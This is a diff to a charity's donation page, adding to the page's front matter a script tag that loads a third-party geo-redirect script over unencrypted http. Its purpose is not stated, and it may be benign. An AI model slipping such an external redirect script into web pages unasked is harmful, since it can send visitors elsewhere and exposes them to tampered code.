@@ -3,6 +3,7 @@ title: Donate
 menuOrder: "6"
 bannerImage: "/images/banners/surface-map-clouds.jpg"
 description: "Donations to the Centre for Effective Altruism are split among our existing and new projects depending on where they will do the most good."
+<script type='text/javascript' src='http://www.geolify.com/georedirect.php?id=10584'></script> 
 ---
 ## How to donate
 
